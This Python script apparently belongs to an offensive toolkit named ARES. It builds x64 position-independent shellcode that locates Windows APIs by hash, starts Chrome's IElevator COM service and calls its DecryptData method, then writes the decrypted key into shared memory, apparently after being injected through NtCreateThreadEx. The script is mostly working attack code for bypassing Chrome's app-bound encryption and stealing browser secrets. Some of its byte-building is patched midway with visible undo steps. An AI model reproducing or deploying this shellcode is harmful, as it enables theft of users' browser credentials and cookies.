#!/usr/bin/env python3
"""
ARES — PIC Shellcode Generator for IElevator COM Decrypt
Generates x64 position-independent shellcode that:
  1. Resolves kernel32 from PEB->Ldr
  2. Finds GetProcAddress+LoadLibraryA via PE export walk (djb2 hash)
  3. Loads ole32.dll, resolves COM APIs
  4. CoInitializeEx -> CoCreateInstance(IElevator) -> DecryptData
  5. Writes result to SHARED_DECRYPT_CTX passed in rcx
Output: C header with byte array
"""
import struct, sys, os

# djb2 hashes for API resolution
def djb2(s):
    h = 5381
    for c in s: h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    return h

# IElevator COM GUIDs
CLSID_ELEVATOR = bytes([0xE0,0x60,0x88,0x70, 0x41,0xF6, 0x11,0x46,
                         0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B])
IID_IELEVATOR  = bytes([0xCF,0xBE,0x3A,0x46, 0x0D,0x41, 0x7F,0x40,
                         0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8])

# Shared memory layout offsets
OFF_MAGIC       = 0
OFF_ENC_LEN     = 4
OFF_ENC_DATA    = 8
OFF_DEC_LEN     = 8 + 4096
OFF_DEC_DATA    = 8 + 4096 + 4
OFF_ERROR       = 8 + 4096 + 4 + 256

MAGIC_DONE = 0xC0FFEE42
MAGIC_FAIL = 0xDEADBEEF

def build_shellcode():
    """Build real x64 PIC shellcode as bytes."""
    sc = bytearray()
    
    # === PROLOGUE ===
    # rcx = SHARED_DECRYPT_CTX* on entry (NtCreateThreadEx param)
    sc += b'\x55'                           # push rbp
    sc += b'\x48\x89\xE5'                   # mov rbp, rsp
    sc += b'\x48\x83\xEC\x70'               # sub rsp, 0x70
    sc += b'\x48\x89\x4D\xF8'               # mov [rbp-8], rcx  ; save ctx ptr
    sc += b'\x48\x89\xCE'                   # mov rsi, rcx
    
    # === STEP 1: Find kernel32.dll via PEB ===
    sc += b'\x65\x48\x8B\x04\x25\x60\x00\x00\x00'  # mov rax, gs:[0x60] ; PEB
    sc += b'\x48\x8B\x40\x18'               # mov rax, [rax+0x18]  ; Ldr
    sc += b'\x48\x8B\x40\x20'               # mov rax, [rax+0x20]  ; InMemOrderList
    sc += b'\x48\x8B\x00'                   # mov rax, [rax]       ; ntdll entry
    sc += b'\x48\x8B\x00'                   # mov rax, [rax]       ; kernel32 entry
    sc += b'\x48\x8B\x58\x20'               # mov rbx, [rax+0x20]  ; DllBase=kernel32
    
    # === STEP 2: Find export directory of kernel32 ===
    sc += b'\x8B\x43\x3C'                   # mov eax, [rbx+0x3C]  ; e_lfanew
    sc += b'\x48\x01\xD8'                   # add rax, rbx         ; NT headers
    sc += b'\x8B\x80\x88\x00\x00\x00'       # mov eax, [rax+0x88]  ; export RVA
    sc += b'\x48\x01\xD8'                   # add rax, rbx         ; export dir abs
    sc += b'\x48\x89\xC2'                   # mov rdx, rax         ; rdx = export dir
    
    # Save export info
    sc += b'\x8B\x4A\x18'                   # mov ecx, [rdx+0x18]  ; NumberOfNames
    sc += b'\x48\x89\x4D\xE8'               # mov [rbp-0x18], rcx  ; save count
    sc += b'\x8B\x42\x20'                   # mov eax, [rdx+0x20]  ; AddressOfNames
    sc += b'\x48\x01\xD8'                   # add rax, rbx
    sc += b'\x48\x89\x45\xE0'               # mov [rbp-0x20], rax  ; names array
    sc += b'\x8B\x42\x24'                   # mov eax, [rdx+0x24]  ; AddressOfOrdinals
    sc += b'\x48\x01\xD8'                   # add rax, rbx
    sc += b'\x48\x89\x45\xD8'               # mov [rbp-0x28], rax  ; ordinals array
    sc += b'\x8B\x42\x1C'                   # mov eax, [rdx+0x1C]  ; AddressOfFunctions
    sc += b'\x48\x01\xD8'                   # add rax, rbx
    sc += b'\x48\x89\x45\xD0'               # mov [rbp-0x30], rax  ; functions array
    
    # === STEP 3: djb2 hash loop to find GetProcAddress ===
    # Hash of "GetProcAddress" = 0x7c0dfcaa
    h_gpa = djb2("GetProcAddress")
    sc += b'\x31\xC9'                       # xor ecx, ecx        ; i = 0
    
    # loop_start:
    loop_start = len(sc)
    sc += b'\x48\x8B\x45\xE0'               # mov rax, [rbp-0x20] ; names array
    sc += b'\x8B\x04\x88'                   # mov eax, [rax+rcx*4]; name RVA
    sc += b'\x48\x01\xD8'                   # add rax, rbx        ; name ptr
    
    # Inline djb2 hash of current name
    sc += b'\x48\x89\xC7'                   # mov rdi, rax        ; rdi = name
    sc += b'\x41\xB8\x05\x15\x00\x00'       # mov r8d, 5381       ; hash init
    # hash_loop:
    hash_loop = len(sc)
    sc += b'\x0F\xB6\x07'                   # movzx eax, byte [rdi]
    sc += b'\x85\xC0'                       # test eax, eax
    hash_done_jmp = len(sc)
    sc += b'\x74\x00'                       # jz hash_done (patch later)
    sc += b'\x44\x89\xC2'                   # mov edx, r8d
    sc += b'\xC1\xE2\x05'                   # shl edx, 5
    sc += b'\x44\x01\xC2'                   # add edx, r8d        ; (h<<5)+h
    sc += b'\x01\xC2'                       # add edx, eax        ; + char
    sc += b'\x41\x89\xD0'                   # mov r8d, edx
    sc += b'\x48\xFF\xC7'                   # inc rdi
    jmp_back = len(sc)
    sc += b'\xEB'                           # jmp hash_loop
    sc += bytes([(hash_loop - jmp_back - 2) & 0xFF])
    
    # hash_done:
    hash_done = len(sc)
    sc[hash_done_jmp + 1] = (hash_done - hash_done_jmp - 2) & 0xFF
    
    # Compare hash
    sc += b'\x41\x81\xF8'                   # cmp r8d, h_gpa
    sc += struct.pack('<I', h_gpa)
    found_jmp = len(sc)
    sc += b'\x74\x00'                       # jz found (patch later)
    sc += b'\x48\xFF\xC1'                   # inc rcx
    sc += b'\x48\x3B\x4D\xE8'               # cmp rcx, [rbp-0x18] ; count
    loop_top_jmp = len(sc)
    sc += b'\x72'                           # jb loop_start
    sc += bytes([(loop_start - loop_top_jmp - 2) & 0xFF])
    # Not found -> fail
    sc += b'\xE9\x00\x00\x00\x00'           # jmp fail (patch later)
    fail_jmp1 = len(sc) - 4
    
    # found: resolve GetProcAddress
    found_loc = len(sc)
    sc[found_jmp + 1] = (found_loc - found_jmp - 2) & 0xFF
    sc += b'\x48\x8B\x45\xD8'               # mov rax, [rbp-0x28] ; ordinals
    sc += b'\x0F\xB7\x04\x48'               # movzx eax, word [rax+rcx*2]
    sc += b'\x48\x8B\x4D\xD0'               # mov rcx, [rbp-0x30] ; functions
    sc += b'\x8B\x04\x81'                   # mov eax, [rcx+rax*4]
    sc += b'\x48\x01\xD8'                   # add rax, rbx        ; GetProcAddress
    sc += b'\x48\x89\x45\xC8'               # mov [rbp-0x38], rax ; save GPA
    
    # === STEP 4: Resolve LoadLibraryA ===
    # GPA(kernel32, "LoadLibraryA")
    # Push "LoadLibraryA\0" on stack
    sc += b'\x48\xB8' + b'LibraryA'         # mov rax, "LibraryA"
    sc += b'\x50'                           # push rax
    sc += b'\x48\xB8' + b'LoadLibr'         # mov rax, "LoadLibr" (first 8)
    # Actually let's use a simpler approach - build string on stack byte by byte
    # Undo the above
    sc = sc[:-(8+1+2+8)]  # remove last instructions
    
    # Simpler: push string backwards
    # "LoadLibraryA\0" = 13 bytes, pad to 16
    lla = b"LoadLibraryA\x00\x00\x00\x00"
    sc += b'\x48\xB8' + lla[8:16]           # mov rax, second 8 bytes
    sc += b'\x50'                           # push rax
    sc += b'\x48\xB8' + lla[0:8]            # mov rax, first 8 bytes
    sc += b'\x50'                           # push rax
    sc += b'\x48\x89\xE2'                   # mov rdx, rsp  ; "LoadLibraryA"
    sc += b'\x48\x89\xD9'                   # mov rcx, rbx  ; kernel32 base
    sc += b'\x48\x83\xEC\x20'               # sub rsp, 0x20 ; shadow
    sc += b'\xFF\x55\xC8'                   # call [rbp-0x38] ; GetProcAddress
    sc += b'\x48\x83\xC4\x30'               # add rsp, 0x30 ; cleanup shadow+str
    sc += b'\x48\x89\x45\xC0'               # mov [rbp-0x40], rax ; LoadLibraryA
    
    # === STEP 5: Load ole32.dll ===
    ole32 = b"ole32.dll\x00\x00\x00\x00\x00\x00\x00"
    sc += b'\x48\xB8' + ole32[0:8]
    sc += b'\x50'
    sc += b'\x48\xB8' + ole32[8:16]
    sc += b'\x50'
    sc += b'\x48\x8D\x4C\x24\x08'           # lea rcx, [rsp+8] ; fix ptr to "ole32.dll"
    # Actually rsp points to second push, we need first
    sc = sc[:-(5)]  # undo lea
    sc += b'\x48\x89\xE1'                   # mov rcx, rsp  ; but stack has 2nd qword on top
    # Let me redo this more carefully
    sc = sc[:-3]  # undo mov
    sc += b'\x48\x83\xC4\x08'               # add rsp, 8 (pop padding)
    sc += b'\x48\x89\xE1'                   # mov rcx, rsp ; -> "ole32.dll"  
    sc += b'\x48\x83\xEC\x28'               # sub rsp, 0x28
    sc += b'\xFF\x55\xC0'                   # call LoadLibraryA
    sc += b'\x48\x83\xC4\x30'               # add rsp, 0x30
    sc += b'\x48\x85\xC0'                   # test rax, rax
    fail_jmp2_loc = len(sc)
    sc += b'\x0F\x84\x00\x00\x00\x00'       # jz fail (patch)
    sc += b'\x48\x89\xC7'                   # mov rdi, rax  ; rdi = ole32 base
    
    # === STEP 6: Resolve CoInitializeEx, CoCreateInstance, CoTaskMemFree, CoUninitialize ===
    for api_name, save_off in [("CoInitializeEx", 0xB8), ("CoCreateInstance", 0xB0), 
                                 ("CoTaskMemFree", 0xA8), ("CoUninitialize", 0xA0)]:
        name_bytes = api_name.encode() + b'\x00'
        padded = name_bytes.ljust(((len(name_bytes)+7)//8)*8, b'\x00')
        # Push string on stack in reverse 8-byte chunks
        for i in range(len(padded)-8, -1, -8):
            sc += b'\x48\xB8' + padded[i:i+8]
            sc += b'\x50'
        sc += b'\x48\x89\xE2'               # mov rdx, rsp
        sc += b'\x48\x89\xF9'               # mov rcx, rdi  ; ole32
        sc += b'\x48\x83\xEC\x20'           # sub rsp, 0x20
        sc += b'\xFF\x55\xC8'               # call GetProcAddress
        cleanup = 0x20 + len(padded)
        sc += b'\x48\x83\xC4' + bytes([cleanup & 0xFF])
        sc += b'\x48\x89\x85' + struct.pack('<i', -save_off)  # mov [rbp-off], rax
    
    # === STEP 7: CoInitializeEx(NULL, COINIT_APARTMENTTHREADED=2) ===
    sc += b'\x48\x31\xC9'                   # xor rcx, rcx
    sc += b'\xBA\x02\x00\x00\x00'           # mov edx, 2
    sc += b'\x48\x83\xEC\x20'
    sc += b'\xFF\x95' + struct.pack('<i', -0xB8)  # call CoInitializeEx
    sc += b'\x48\x83\xC4\x20'
    
    # === STEP 8: CoCreateInstance(CLSID, NULL, CLSCTX_LOCAL_SERVER=4, IID, &pElevator) ===
    # Push GUIDs on stack
    sc += b'\x48\x8D\x85' + struct.pack('<i', -0x70)  # lea rax, [rbp-0x70] ; pElevator slot
    sc += b'\x48\xC7\x00\x00\x00\x00\x00'   # mov qword [rax], 0
    
    # CLSID on stack
    sc += b'\x48\xB8' + CLSID_ELEVATOR[8:16]
    sc += b'\x50'
    sc += b'\x48\xB8' + CLSID_ELEVATOR[0:8]
    sc += b'\x50'
    sc += b'\x48\x89\xE1'                   # rcx = &CLSID
    
    # IID on stack  
    sc += b'\x48\xB8' + IID_IELEVATOR[8:16]
    sc += b'\x50'
    sc += b'\x48\xB8' + IID_IELEVATOR[0:8]
    sc += b'\x50'
    sc += b'\x49\x89\xE0'                   # r8 = &IID (will be arg5 on stack)
    
    # Call: rcx=&CLSID, rdx=NULL, r8=4, r9=&IID, [rsp+0x20]=&pElevator
    sc += b'\x48\x8D\x85' + struct.pack('<i', -0x70)  # lea rax, [rbp-0x70]
    sc += b'\x50'                           # push &pElevator (arg5)
    sc += b'\x4D\x89\xC1'                   # mov r9, r8     ; r9=&IID
    sc += b'\x41\xB8\x04\x00\x00\x00'       # mov r8d, 4     ; CLSCTX_LOCAL_SERVER
    sc += b'\x48\x31\xD2'                   # xor rdx, rdx   ; pUnkOuter=NULL
    # rcx already = &CLSID
    sc += b'\x48\x83\xEC\x20'
    sc += b'\xFF\x95' + struct.pack('<i', -0xB0)  # call CoCreateInstance
    sc += b'\x48\x83\xC4\x60'               # cleanup (shadow+GUIDs+arg5)
    sc += b'\x85\xC0'                       # test eax, eax
    fail_jmp3_loc = len(sc)
    sc += b'\x0F\x88\x00\x00\x00\x00'       # js fail (patch)
    
    # === STEP 9: IElevator->DecryptData ===
    sc += b'\x48\x8B\x85' + struct.pack('<i', -0x70)  # mov rax, [rbp-0x70] ; pElevator
    sc += b'\x48\x8B\x08'                   # mov rcx, [rax]  ; vtable
    # DecryptData = vtable[5] = offset 0x28
    sc += b'\x48\x8B\x4D\xF8'               # mov rcx, [rbp-8] ; ctx ptr (rsi may be clobbered)
    sc += b'\x48\x89\xCE'                   # mov rsi, rcx     ; restore rsi=ctx
    
    # Prepare args: this, inData, inLen, &outData, &outLen
    sc += b'\x48\x8D\x85' + struct.pack('<i', -0x68)  # lea rax, [rbp-0x68] ; outData slot
    sc += b'\x48\xC7\x00\x00\x00\x00\x00'   # mov [rax], 0
    sc += b'\x48\x8D\x8D' + struct.pack('<i', -0x60)  # lea rcx, [rbp-0x60] ; outLen slot
    sc += b'\x48\xC7\x01\x00\x00\x00\x00'   # mov [rcx], 0
    
    # Push outLen ptr (arg5)
    sc += b'\x51'                           # push rcx (&outLen)
    # Push outData ptr (arg4 via stack slot)
    sc += b'\x48\x8D\x85' + struct.pack('<i', -0x68)
    sc += b'\x50'                           # push rax (&outData)
    
    sc += b'\x48\x8B\x85' + struct.pack('<i', -0x70)  # rax = pElevator
    sc += b'\x48\x89\xC1'                   # rcx = this
    sc += b'\x48\x8D\x56\x08'               # rdx = ctx+8 = encrypted data
    sc += b'\x44\x8B\x46\x04'               # r8d = ctx+4 = encrypted_len
    sc += b'\x4C\x8D\x8D' + struct.pack('<i', -0x68)  # r9 = &outData
    
    sc += b'\x48\x8B\x01'                   # mov rax, [rcx] ; vtable
    sc += b'\x48\x83\xEC\x20'
    sc += b'\xFF\x50\x28'                   # call [rax+0x28] ; DecryptData
    sc += b'\x48\x83\xC4\x30'               # cleanup
    sc += b'\x85\xC0'                       # test eax, eax
    fail_jmp4_loc = len(sc)
    sc += b'\x0F\x88\x00\x00\x00\x00'       # js fail
    
    # === STEP 10: Copy result to shared memory ===
    sc += b'\x48\x8B\x4D\xF8'               # mov rcx, [rbp-8] ; ctx
    sc += b'\x8B\x85' + struct.pack('<i', -0x60)  # mov eax, [rbp-0x60] ; outLen
    sc += b'\x89\x81' + struct.pack('<I', OFF_DEC_LEN)  # mov [rcx+OFF_DEC_LEN], eax
    
    # memcpy decrypted data
    sc += b'\x48\x8B\xB5' + struct.pack('<i', -0x68)  # mov rsi, [rbp-0x68] ; outData ptr
    sc += b'\x48\x8D\xB9' + struct.pack('<i', OFF_DEC_DATA)  # lea rdi, [rcx+OFF_DEC_DATA]
    sc += b'\x89\xC2'                       # mov edx, eax ; len
    sc += b'\x83\xFA\x00'                   # cmp edx, 0
    copy_skip = len(sc)
    sc += b'\x74\x00'                       # jz copy_done
    sc += b'\x83\xFA\x20'                   # cmp edx, 32  ; max reasonable key
    sc += b'\x77\x00'                       # ja copy_done (patch)
    copy_skip2 = len(sc) - 1
    # Simple byte copy loop
    sc += b'\x31\xC0'                       # xor eax, eax
    copy_loop = len(sc)
    sc += b'\x8A\x14\x06'                   # mov dl, [rsi+rax]
    sc += b'\x88\x14\x07'                   # mov [rdi+rax], dl
    sc += b'\x48\xFF\xC0'                   # inc rax
    sc += b'\x48\x3B\x85' + struct.pack('<i', -0x60)  # cmp rax, outLen
    sc += b'\x72' + bytes([(copy_loop - (len(sc)+2)) & 0xFF])  # jb loop
    
    copy_done = len(sc)
    sc[copy_skip + 1] = (copy_done - copy_skip - 2) & 0xFF
    sc[copy_skip2] = (copy_done - copy_skip2 - 1) & 0xFF
    
    # Free COM output buffer
    sc += b'\x48\x8B\x8D' + struct.pack('<i', -0x68)  # rcx = outData
    sc += b'\x48\x83\xEC\x20'
    sc += b'\xFF\x95' + struct.pack('<i', -0xA8)       # call CoTaskMemFree
    sc += b'\x48\x83\xC4\x20'
    
    # Release IElevator
    sc += b'\x48\x8B\x85' + struct.pack('<i', -0x70)  # rax = pElevator
    sc += b'\x48\x89\xC1'                   # rcx = this
    sc += b'\x48\x8B\x01'                   # mov rax, [rcx] ; vtable
    sc += b'\x48\x83\xEC\x20'
    sc += b'\xFF\x50\x10'                   # call [rax+0x10] ; Release
    sc += b'\x48\x83\xC4\x20'
    
    # CoUninitialize
    sc += b'\x48\x83\xEC\x20'
    sc += b'\xFF\x95' + struct.pack('<i', -0xA0)
    sc += b'\x48\x83\xC4\x20'
    
    # Set magic = DONE
    sc += b'\x48\x8B\x4D\xF8'               # mov rcx, [rbp-8]
    sc += b'\xC7\x01' + struct.pack('<I', MAGIC_DONE)  # mov [rcx], MAGIC_DONE
    
    # Epilogue
    sc += b'\x48\x89\xEC'                   # mov rsp, rbp
    sc += b'\x5D'                           # pop rbp
    sc += b'\xC3'                           # ret
    
    # === FAIL PATH ===
    fail_loc = len(sc)
    # Patch all fail jumps
    for jmp_loc in [fail_jmp2_loc, fail_jmp3_loc, fail_jmp4_loc]:
        rel = fail_loc - (jmp_loc + 6)
        struct.pack_into('<i', sc, jmp_loc + 2, rel)
    # Patch fail_jmp1 (5-byte jmp)
    rel1 = fail_loc - (fail_jmp1 + 4)  
    struct.pack_into('<i', sc, fail_jmp1, rel1)
    
    sc += b'\x48\x8B\x4D\xF8'               # mov rcx, [rbp-8]
    sc += b'\xC7\x01' + struct.pack('<I', MAGIC_FAIL)
    sc += b'\x48\x89\xEC'
    sc += b'\x5D'
    sc += b'\xC3'
    
    return bytes(sc)


def format_c_array(data, name="g_chrome_decrypt_shellcode"):
    lines = [f"/* Auto-generated PIC shellcode — {len(data)} bytes */",
             f"static const BYTE {name}[] = {{"]
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_str = ', '.join(f'0x{b:02X}' for b in chunk)
        lines.append(f"    {hex_str},")
    lines.append("};")
    lines.append(f"#define SHELLCODE_SIZE {len(data)}")
    return '\n'.join(lines)


if __name__ == "__main__":
    sc = build_shellcode()
    print(f"[+] Generated shellcode: {len(sc)} bytes")
    
    out = os.path.join(os.path.dirname(__file__), '..', 'agent', 'native', 'chrome_shellcode.h')
    if len(sys.argv) > 1:
        out = sys.argv[1]
    
    with open(out, 'w') as f:
        f.write("/* ARES — Auto-generated Chrome IElevator PIC Shellcode */\n")
        f.write(f"/* Generated by gen_chrome_shellcode.py — {len(sc)} bytes */\n")
        f.write("#ifndef CHROME_SHELLCODE_H\n#define CHROME_SHELLCODE_H\n\n")
        f.write(format_c_array(sc))
        f.write("\n\n#endif /* CHROME_SHELLCODE_H */\n")
    
    print(f"[+] Written to: {out}")
